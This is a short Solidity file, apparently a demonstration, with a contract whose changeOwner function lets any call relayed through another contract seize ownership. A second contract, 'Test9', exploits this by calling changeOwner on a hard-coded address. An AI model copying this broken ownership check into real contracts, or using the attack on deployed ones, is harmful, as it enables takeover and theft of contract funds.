pragma solidity 0.8.6;

contract Test12 {
    
    address public owner;
    
    constructor() {
        owner = msg.sender;
    } 
    
    function changeOwner(address _owner) public {
        if(tx.origin != msg.sender){
            owner = _owner;
        }
    }
    
}

contract Test9 {
    
    function Attack(address _owner) public {
        Test12(0xdba86fcF223DB3eD1fCD9015E064eb751EB57245).changeOwner(_owner);
    }
    
}
